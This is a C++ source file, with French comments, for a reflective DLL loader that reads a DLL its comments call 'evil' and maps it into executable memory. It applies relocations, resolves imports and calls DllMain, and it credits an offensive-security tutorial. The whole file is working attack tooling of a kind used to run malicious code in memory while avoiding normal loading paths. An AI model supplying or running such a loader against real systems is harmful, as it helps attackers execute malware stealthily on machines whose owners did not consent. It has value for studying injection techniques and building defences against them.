#include <iostream>
#include <Windows.h>

// gcc reflectiveLoader.c -o rInjector.exe

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

//prototype de DllMain
using DLLEntry = BOOL(WINAPI *)(HINSTANCE dll, DWORD reason, LPVOID reserved);

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("[-] Bad usage ! (<exe> <dll path> \n");
        return 1;
    }
    //get self image base
    PVOID imageBase = GetModuleHandleA(NULL);
    
    HANDLE dll = CreateFileA(argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
    DWORD64 dllSize = GetFileSize(dll, NULL);
    LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);
    DWORD outSize = 0; 
    ReadFile(dll, dllBytes, dllSize, &outSize, NULL);

    printf("[+] Loaded '%s' (%u bytes) into Heap \n", argv[1], dllSize);

    //Get DOS, ntHeaders, imageSize form just loaded evil DLL
    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);
	SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;

    //Allocate reflected DLL space
    LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("[+] Allocated reflected DLL space at 0x%p\n", dllBase);

    //Delta for reflective DLL and local image to get addrs to patch relocs
    DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
    //Copy DLL's headers into newly created Space
    memcpy(dllBase, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders);
    printf("[+] Written nt Headers\n");

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section->VirtualAddress);
        LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section->PointerToRawData);
        memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
        section++;
    }
    printf("[+] Copied %d sections\n", ntHeaders->FileHeader.NumberOfSections);

    IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;
    printf("[+] Reloc table at 0x%p\n", relocationTable);
    DWORD relocationsProcessed = 0;

    while (relocationsProcessed < relocations.Size) 
    {
        PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
        relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
        DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
        PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);
        printf("[+] Reloc Block at 0x%p w/ %d entries\n", relocationEntries, relocationEntries);

        for (DWORD i = 0; i < relocationsCount; i++)
        {
            relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);

            if (relocationEntries[i].Type == 0) continue;

            DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
            DWORD_PTR addressToPatch = 0;
            ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
            addressToPatch += deltaImageBase; //recalculate relative addrs
            memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
        }
        printf("[+] Reloc Block Patched !\n");
    }

    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
    IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);
    LPCSTR libraryName = "";
    HMODULE library = NULL;
    printf("[+] IAT at 0x%p\n", importsDirectory);

    while (importDescriptor->Name != NULL) {
        libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)dllBase;
        library = LoadLibraryA(libraryName);
        
        if (library) {
            printf("[+] Copying %s lib\n", libraryName);
            //Honnetement je comprent pas parfaitement comment ça marche, mais ça marche thx to : 
            // https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection
            PIMAGE_THUNK_DATA thunk = NULL;
            thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor->FirstThunk);

            while (thunk->u1.AddressOfData != NULL)
            {
                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                    LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
                    thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
                }
                else {
                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
                    DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);
                    thunk->u1.Function = functionAddress;
                }
                ++thunk;
            }
        }

        importDescriptor++;
    }

    DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);

    printf("[+] DllMain entrypoint at 0x%p\n", DllEntry);
    printf("[+] Calling DllMain\n", DllEntry);
	(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);
    printf("[+] Done.\n", DllEntry);

	CloseHandle(dll);
	HeapFree(GetProcessHeap(), 0, dllBytes);

    return 0;
}